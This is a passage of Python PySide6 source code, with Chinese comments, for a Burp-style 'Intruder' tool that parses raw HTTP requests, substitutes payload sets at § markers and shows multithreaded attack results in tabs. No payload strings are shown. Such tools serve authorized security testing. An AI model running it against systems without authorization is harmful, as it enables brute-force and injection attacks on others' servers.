            self.payload_sets[idx] = bypass_payloads
    
    def _parse_request(self, req_text: str):
        lines = req_text.strip().splitlines()
        if not lines:
            return None, None, None, None
        
        first_line = lines[0].strip()
        parts = first_line.split(' ')
        if len(parts) < 2:
            return None, None, None, None
        
        method = parts[0]
        url = parts[1]
        
        headers = {}
        body_start = 0
        for i, line in enumerate(lines[1:], 1):
            if line.strip() == '':
                body_start = i + 1
                break
            if ':' in line:
                key, value = line.split(':', 1)
                headers[key.strip()] = value.strip()
        
        body = '\n'.join(lines[body_start:]) if body_start > 0 else ''

        if url.startswith('/'):
            host = headers.get('Host') or headers.get('host') or ''
            host = host.strip()
            if host:
                scheme = 'http'
                url = f"{scheme}://{host}{url}"
        return method, url, headers, body
    
    def _start_attack(self):
        # 先保存当前输入框中的payload到当前集合
        payloads_text = self.payload_input.toPlainText().strip()
        if payloads_text:
            payloads = [p.strip() for p in payloads_text.split('\n') if p.strip()]
            idx = self.payload_set_combo.currentIndex()
            if idx >= 0:
                self.payload_sets[idx] = payloads
        
        # 检查是否有任何payload集合
        total_payloads = sum(len(ps) for ps in self.payload_sets)
        if total_payloads == 0:
            QMessageBox.warning(self, "警告", "请输入payload")
            return
        
        # 检查每个集合是否为空
        for i, ps in enumerate(self.payload_sets):
            if not ps:
                QMessageBox.warning(self, "警告", f"Payload集合 {i+1} 为空")
                return
        
        req_text = self.req_edit.toPlainText()
        method, url, headers, body = self._parse_request(req_text)
        
        if not url:
            QMessageBox.warning(self, "警告", "请求格式不正确")
            return
        
        if '§' not in req_text:
            QMessageBox.warning(self, "警告", "请使用 § § 标记payload位置")
            return
        
        self.results_table.setRowCount(0)
        self.detail_text.clear()
        self.detail_status.setText("")
        self.detail_length.setText("")
        self.detail_payload.setText("")
        self.progress_bar.setMaximum(1)
        self.progress_bar.setValue(0)
        
        base_request = {'url': url, 'method': method, 'headers': headers, 'body': body}
        
        # 【关键修复】传递所有payload集合，而不仅仅是当前选中的
        self.worker = IntruderWorker(
            base_request=base_request,
            payloads=self.payload_sets,  # 使用所有集合
            attack_mode=self.current_mode,
            threads=self.thread_spin.value()
        )
        
        self.worker.result_ready.connect(self._on_result)
        self.worker.progress_update.connect(self._on_progress)
        self.worker.finished_signal.connect(self._on_finished)
        self.worker.error_signal.connect(self._on_error)
        
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.status_label.setText("攻击中...")
        self.status_label.setStyleSheet(f"color: {COLORS['accent']}; font-weight: bold;")
        
        self.worker.start()
    
    def _stop_attack(self):
        if self.worker:
            self.worker.stop()
            self.worker.wait()
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_label.setText("已停止")
        self.status_label.setStyleSheet(f"color: {COLORS['text_secondary']};")
    
    def _on_result(self, result: dict):
        row = self.results_table.rowCount()
        self.results_table.insertRow(row)
        
        # 【修复】使用SortableTableWidgetItem以支持排序
        self.results_table.setItem(row, 0, SortableTableWidgetItem(str(result['index'] + 1)))
        
        payload_item = SortableTableWidgetItem(result['payload'])
        payload_item.setToolTip(result['payload'])
        self.results_table.setItem(row, 1, payload_item)
        
        status_code = result['status_code']
        status_item = SortableTableWidgetItem(str(status_code))
        if 200 <= status_code < 300:
            status_item.setForeground(QColor(COLORS['success']))
        elif 300 <= status_code < 400:
            status_item.setForeground(QColor(COLORS['warning']))
        elif status_code >= 400:
            status_item.setForeground(QColor(COLORS['danger']))
        self.results_table.setItem(row, 2, status_item)
        
        # 【修复】使用SortableTableWidgetItem以支持排序
        length_item = SortableTableWidgetItem(str(result['length']))
        self.results_table.setItem(row, 3, length_item)
        
        # 修复 TypeError: 'NoneType' object is not subscriptable
        error = result.get('error', '') or ''
        error_item = QTableWidgetItem(error[:30] if error else '')
        if error:
            error_item.setForeground(QColor(COLORS['danger']))
        self.results_table.setItem(row, 4, error_item)
        
        # 存储完整结果数据
        status_item.setData(Qt.UserRole, result)
        
        # 排序后滚动到底部可能不适合，改为选择当前行
        self.results_table.selectRow(row)
    
    def _on_progress(self, current: int, total: int):
        self.progress_bar.setMaximum(total)
        self.progress_bar.setValue(current)
        self.status_label.setText(f"{current}/{total}")
    
    def _on_finished(self):
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.progress_bar.setValue(self.progress_bar.maximum())
        self.status_label.setText("完成")
        self.status_label.setStyleSheet(f"color: {COLORS['success']}; font-weight: bold;")
    
    def _on_error(self, error_msg: str):
        QMessageBox.critical(self, "错误", error_msg)
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_label.setText("错误")
        self.status_label.setStyleSheet(f"color: {COLORS['danger']};")
    
    def _show_result_detail(self, item):
        row = item.row()
        status_item = self.results_table.item(row, 2)
        if status_item:
            result = status_item.data(Qt.UserRole)
            if result:
                self.detail_status.setText(f"状态码: {result['status_code']}")
                self.detail_length.setText(f"长度: {result['length']} bytes")
                self.detail_payload.setText(f"Payload: {result['payload']}")
                
                # 显示请求
                request_str = result.get('request', '')
                self.request_text.setPlainText(request_str)
                
                # 【修复】使用ResponseViewerWidget显示响应（支持Render视图）
                if hasattr(self, 'response_viewer'):
                    # 【修复】从请求中提取URL信息
                    url = ''
                    request_str = result.get('request', '')
                    if request_str:
                        lines = request_str.split('\n')
                        if lines and ' ' in lines[0]:
                            parts = lines[0].split(' ')
                            if len(parts) >= 2:
                                url_path = parts[1]
                                # 从请求头中提取Host
                                for line in lines[1:]:
                                    if line.lower().startswith('host:'):
                                        host = line.split(':', 1)[1].strip()
                                        if host:
                                            # 构造完整URL - 【修复】正确判断 HTTPS
                                            # 检查是否包含端口号，以及是否可能是 HTTPS
                                            is_https = False
                                            if ':' in host:
                                                port = host.split(':')[-1]
                                                is_https = port == '443'
                                            scheme = 'https' if is_https else 'http'
                                            url = f"{scheme}://{host}{url_path}"
                                        break
                    
                    # 使用ResponseViewerWidget显示完整响应
                    response_dict = {
                        'status_code': result.get('status_code', 0),
                        'headers': result.get('headers', ''),
                        'body': result.get('body', ''),
                        'body_bytes': result.get('body_bytes', b''),
                        'url': url,
                        'time': 0.0,  # Intruder不记录时间
                        'error': result.get('error', '')
                    }
                    self.response_viewer.set_response_from_dict(response_dict)
                else:
                    # 回退到纯文本视图
                    headers = result.get('headers', '')
                    body = result.get('body', '')
                    response_str = f"HTTP/1.1 {result['status_code']}\n{headers}\n\n{body}"
                    self.response_text.setPlainText(response_str)
                
                # 兼容旧的detail_text
                self.detail_text.setPlainText(result.get('body', ''))
    
    def load_request(self, request_data: dict):
        """加载请求到Intruder"""
        method = request_data.get('method', 'GET')
        url = request_data.get('url', '')
        headers = request_data.get('request_headers', '')
        body = request_data.get('request_body', '')
        
        # 构建请求模板
        req_text = f"{method} {url} HTTP/1.1\n{headers}\n\n{body}"
        self.req_edit.setPlainText(req_text)

class IntruderWidget(QWidget):
    """多标签页Intruder组件 (Burp-style)"""
    
    def __init__(self):
        super().__init__()
        self._tab_counter = 1
        # 【修复】保存已关闭的 widget 引用，避免立即 deleteLater 导致崩溃
        self._closed_tabs = []
        self._init_ui()
    
    def _init_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(0, 0, 0, 0)
        
        # 工具栏
        toolbar = QHBoxLayout()
        
        # 新建标签按钮
        self.new_tab_btn = QPushButton("+ 新建标签")
        self.new_tab_btn.setStyleSheet(f"background-color: {COLORS['success']}; color: white; font-weight: bold; padding: 5px 15px;")
        self.new_tab_btn.clicked.connect(self._on_new_tab)
        toolbar.addWidget(self.new_tab_btn)
        
        # 关闭标签按钮
        self.close_tab_btn = QPushButton("关闭标签")
        self.close_tab_btn.setStyleSheet(f"background-color: {COLORS['danger']}; color: white; padding: 5px 15px;")
        self.close_tab_btn.clicked.connect(self._on_close_tab)
        toolbar.addWidget(self.close_tab_btn)
        
        toolbar.addStretch()
        layout.addLayout(toolbar)
        
        # 标签栏 - 设置紧凑样式
        self.tab_bar = QTabBar()
        self.tab_bar.setTabsClosable(True)
        self.tab_bar.setMovable(True)
        self.tab_bar.setExpanding(False)  # 【新增】不自动扩展，保持固定大小
        self.tab_bar.setElideMode(Qt.ElideRight)  # 【新增】文本过长时省略
        self.tab_bar.setStyleSheet("""
            QTabBar::tab {
                min-width: 80px;
                max-width: 150px;
                padding: 5px 10px;
                margin-right: 2px;
            }
        """)
        self.tab_bar.tabCloseRequested.connect(self._on_tab_close_requested)
        self.tab_bar.currentChanged.connect(self._on_tab_changed)
        self.tab_bar.tabBarDoubleClicked.connect(self._on_tab_rename)
        layout.addWidget(self.tab_bar)
        
        # 内容区域
        self.content_stack = QStackedWidget()
        layout.addWidget(self.content_stack, stretch=1)
        
        # 创建默认标签
        self._add_tab("Intruder 1")
    
    def _add_tab(self, name: str = None) -> int:
        """添加新标签"""
        if name is None:
            name = f"Intruder {self._tab_counter}"
        self._tab_counter += 1
        
        tab = IntruderTab(name)
        index = self.content_stack.addWidget(tab)
        tab_index = self.tab_bar.addTab(name)
        
        self.tab_bar.setCurrentIndex(tab_index)
        return tab_index
    
    def _on_new_tab(self):
        """新建标签"""
        self._add_tab()
    
    def _on_close_tab(self):
        """关闭当前标签"""
        current = self.tab_bar.currentIndex()
        if current >= 0:
            self._on_tab_close_requested(current)
    
    def _on_tab_close_requested(self, index: int):
        """关闭指定标签 - 【修复】应用 Repeater 相同的崩溃修复"""
        if self.tab_bar.count() <= 1:
            QMessageBox.information(self, "提示", "至少需要保留一个标签")
            return
        
        try:
            # index 合法性保护
            if index < 0 or index >= self.content_stack.count():
                return
            
            # 获取 widget 并安全停止 worker
            widget = self.content_stack.widget(index)
            if widget and isinstance(widget, IntruderTab):
                self._stop_tab_worker(widget)
            
            # 阻断信号避免级联触发
            from PySide6.QtCore import QSignalBlocker
            blocker_tab = QSignalBlocker(self.tab_bar)
            blocker_stack = QSignalBlocker(self.content_stack)
            if widget:
                try:
                    widget.blockSignals(True)
                except Exception:
                    pass
            
            try:
                if widget is not None:
                    # 【关键修复】缓存 widget 而非立即 deleteLater
                    widget.hide()
                    widget.setParent(None)
                    self._closed_tabs.append(widget)
                    self.content_stack.removeWidget(widget)
                    # 限制缓存数量
                    if len(self._closed_tabs) > 20:
                        old_widget = self._closed_tabs.pop(0)
                        try:
                            old_widget.deleteLater()
                        except Exception:
                            pass
                
                self.tab_bar.removeTab(index)
            finally:
                if widget:
                    try:
                        widget.blockSignals(False)
                    except Exception:
                        pass
                del blocker_stack
                del blocker_tab
            
            # 延迟修正 currentIndex
            if self.tab_bar.count() > 0:
                new_current = min(self.tab_bar.currentIndex(), self.tab_bar.count() - 1)
                if new_current < 0:
                    new_current = 0
                from PySide6.QtCore import QTimer
                QTimer.singleShot(50, lambda: self._safe_set_current(new_current))
                
        except Exception as e:
            print(f"关闭 Intruder 标签时出错: {e}")
            import traceback
            traceback.print_exc()
    
    def _stop_tab_worker(self, tab: IntruderTab):
        """安全停止 IntruderTab 的 worker"""
        try:
            worker = getattr(tab, 'worker', None)
            if worker and worker.isRunning():
                # 断开信号
                try:
                    worker.result_ready.disconnect(tab._on_result)
                except Exception:
                    pass
                try:
                    worker.finished_signal.disconnect(tab._on_finished)
                except Exception:
                    pass
                try:
                    worker.error_signal.disconnect(tab._on_error)
                except Exception:
                    pass
                # 停止 worker
                worker.stop()
                tab.worker = None
        except Exception:
            pass
    
    def _safe_set_current(self, index: int):
        """安全设置当前标签"""
        try:
            if 0 <= index < self.tab_bar.count():
                self.tab_bar.setCurrentIndex(index)
            if 0 <= index < self.content_stack.count():
                self.content_stack.setCurrentIndex(index)
        except Exception:
            pass
    
    def _on_tab_changed(self, index: int):
        """切换标签"""
        if index >= 0:
            self.content_stack.setCurrentIndex(index)
    
    def _on_tab_rename(self, index: int):
        """重命名标签"""
        current_name = self.tab_bar.tabText(index)
        dialog = QInputDialog(self)
        dialog.setWindowTitle("重命名标签")
        dialog.setLabelText("请输入新名称:")
        dialog.setTextValue(current_name)
        dialog.resize(400, 150)
        if dialog.exec() == QInputDialog.Accepted:
            new_name = dialog.textValue()
            if new_name:
                self.tab_bar.setTabText(index, new_name)
    
    def load_request(self, request_data: dict, create_new_tab: bool = True):
        """加载请求到Intruder - 默认创建新标签"""
        if create_new_tab:
            # 创建新标签并加载请求
            tab_index = self._add_tab()
            current_widget = self.content_stack.widget(tab_index)
        else:
            # 加载到当前标签（兼容旧行为）
            current_widget = self.content_stack.currentWidget()
        
        if current_widget and isinstance(current_widget, IntruderTab):
            current_widget.load_request(request_data)
